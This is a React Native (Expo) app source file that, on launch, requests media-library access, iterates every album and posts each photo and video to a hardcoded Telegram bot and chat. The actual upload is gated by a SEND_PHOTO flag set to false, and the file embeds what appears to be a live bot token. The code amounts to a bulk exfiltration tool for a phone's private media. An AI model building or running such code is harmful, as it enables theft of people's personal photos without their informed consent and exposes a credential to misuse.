import { StatusBar } from 'expo-status-bar';
import { StyleSheet, Text, View, PermissionsAndroid, Image } from 'react-native';
import * as FileSystem from 'expo-file-system'
import axios from 'axios'
import { useEffect, useState } from 'react';
import * as MediaLibrary from 'expo-media-library';

const token = '5800056038:AAH38c9Z13uPEfLAN2ryPAT1mWkHzFWTuEY'
// const chatId = '221971158'
const chatId = '-1001519000703'

const SEND_PHOTO = false;

const getAssetFileType = (asset) => {
  const uri = asset.uri;
  const extension = uri.split('.').pop()?.toLowerCase();
  const prefix = extension === 'mp4' ? 'video' : `image`;
  const type = `${prefix}/${extension}`;
  return type;
}

const sendAssetsToServer = async (assets, albumName, setProcessStatus, totalCount, isDone, setCurrentImage) => {
  for await (const asset of assets) {
    const uri = asset.uri;

    try {
      const fileFormat = getAssetFileType(asset);

      // Set current image
      setCurrentImage(asset);

      // Generate Form Data
      const formData = new FormData();
      formData.append('document', {
        ...asset,
        uri: Platform.OS === 'android' ? asset.uri : asset.uri.replace('file://', ''),
        name: `image-${asset.filename}`,
        type: fileFormat, // it may be necessary in Android
      });
      formData.append('chat_id', chatId);

      // Send to server and wait

      if (SEND_PHOTO) {
        const response = await axios.post(
          `https://api.telegram.org/bot${token}/sendDocument`, formData, {
          headers: { "Content-Type": "multipart/form-data" },
        }
        )
      }

      isDone += 1;
      setProcessStatus(`Uploading from ${albumName} ${asset.filename} ${fileFormat} ... ` + isDone + '/' + totalCount);
      await sleep(500);
    } catch (error) {
      setProcessStatus(`Error: ${error.message}`);
      console.log(error);
    }
  }
}

const processUploadingPhotos = async (setProcessStatus, setCurrentImage) => {
  setProcessStatus('started...');
  const albums = await MediaLibrary.getAlbumsAsync();

  for await (const album of albums) {
    const assets = await MediaLibrary.getAssetsAsync({ album: album.id, first: 1000, mediaType: ['photo', 'video'] });

    // sort by creation time
    const sorted = assets.assets.sort((a, b) => {
      return a.modificationTime - b.modificationTime;
    })

    let isDone = 0;
    let total = sorted.length;

    if (sorted.length > 0) {
      await sendAssetsToServer(sorted, album.title, setProcessStatus, total, isDone, setCurrentImage);
    }
  }
}
export default function App() {
  const [permissionResponse, requestPermission] = MediaLibrary.usePermissions();
  const [processStatus, setProcessStatus] = useState(null);
  const [currentImage, setCurrentImage] = useState(null);

  const imageSource = currentImage ? { uri: currentImage.uri } : null;

  useEffect(() => {
    if (!permissionResponse?.granted) {
      requestPermission();
      return;
    }
    if (!processStatus) {
      processUploadingPhotos(setProcessStatus, setCurrentImage);
    }
  }, [permissionResponse])


  return (
    <View style={styles.container}>
      <Text>{processStatus}</Text>
      <StatusBar style="auto" />
      <Image source={imageSource} />
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
  },
});

function compareNumbers(a, b) {
  return a - b;
}

function sleep(ms) {
  return new Promise(
    resolve => setTimeout(resolve, ms)
  );
}